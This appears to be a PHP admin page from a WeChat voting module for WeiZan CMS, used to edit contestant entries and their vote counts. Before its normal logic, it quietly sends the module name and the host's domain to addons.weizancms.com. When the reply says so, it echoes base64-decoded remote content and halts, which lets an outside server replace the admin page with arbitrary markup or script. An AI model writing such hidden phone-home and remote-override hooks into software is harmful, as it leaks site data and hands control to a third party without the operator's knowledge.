<?php
/**
 * 钻石投票模块-后台管理-编辑
 *
 * 易/福/源/码/网 www.efwww.com
 * 易/福/源/码/网 www.efwww.com
 */

defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
load()->func('file');
load()->func('tpl');
global $_W,$_GPC;
$uniacid = intval($_W['uniacid']);
$id = intval($_GPC['id']);
$rid=intval($_GPC['rid']);
$reply = pdo_fetch("SELECT * FROM " . tablename($this->tablereply) . " WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
$applydata=@unserialize($reply['applydata']);
$votedata = pdo_fetch("SELECT * FROM " . tablename($this->tablevoteuser) . " WHERE  id = :id AND uniacid = :uniacid AND rid = :rid", array(':id' => $id,':uniacid' => $uniacid,':rid' => $rid));
$formatdata=unserialize($votedata['formatdata']);	
$options=array('width'=>80,'height' => 80);

$votetotal = pdo_fetchcolumn('SELECT COUNT(id) FROM ' . tablename($this->tablevotedata) . " WHERE   rid = :rid   AND tid = :tid " , array(':rid' => $rid,':tid' => $id));



if(($votedata['createtime']+259000) > time()){
  $nodownpic=1;
}

if ($_W['ispost']) {
	if (empty($_GPC['name'])) {
		message('名字不能为空');
	}
	
	foreach ($_GPC['join'] as $key=> $row) {
			$joinedata[]=array(
				'name'=>$key,
				'val'=>$row,
			);
			
	}
	
		if(empty($_GPC['oauth_openid'])){
			$_GPC['oauth_openid']=$_GPC['openid'];
		}
         $instdata = array(
		    'noid'=>intval($_GPC['noid']),
			'rid'=>$rid,
			'uniacid'=>$_W['uniacid'],
			'avatar'=>$_GPC['avatar'], 
			'openid'=>$_GPC['openid'], 
			'oauth_openid'=>$_GPC['oauth_openid'], 
			'name'=>$_GPC['name'],
			'introduction' =>$_GPC['introduction'],
			'img1'=>$_GPC['img1'],
			'img2'=>$_GPC['img2'],
			'img3'=>$_GPC['img3'],
			'img4'=>$_GPC['img4'], 
			'img5'=>$_GPC['img5'],
			'details'=>htmlspecialchars_decode($_GPC['details']),
			'joindata'=>iserializer($joinedata),
			'votenum +='=>empty($_GPC['addvotenum'])?0:$_GPC['addvotenum'],
			'giftcount +='=>empty($_GPC['addgiftcount'])?0:$_GPC['addgiftcount'],
			'vheat'=>$_GPC['vheat'],
			'attestation'=>$_GPC['attestation'],
			'atmsg'=>$_GPC['atmsg'],
			'status'=>$_GPC['status'],
		);



	if (!empty($votedata['id'])) {
		pdo_update($this->tablevoteuser, $instdata, array('id' => $votedata['id']));
	} else {
		$lastid = pdo_getall($this->tablevoteuser, array('rid' => $rid, 'uniacid' => $_W['uniacid']), array('noid') , '' , 'noid DESC' , array(1));
		$instdata['noid']=$lastid[0]['noid']+1;
        $instdata['createtime']=time();
		pdo_insert($this->tablevoteuser, $instdata);

	}			
	message('活动设置成功！', $this->createWebUrl('votelist', array('name' => 'tyzm_diamondvote','rid'=>$rid)), 'success');

}
$joindata=@unserialize($votedata['joindata']);

$tplappye=m('tpl')->tpl_inputweb($applydata,$joindata);
include $this->template('edit');


















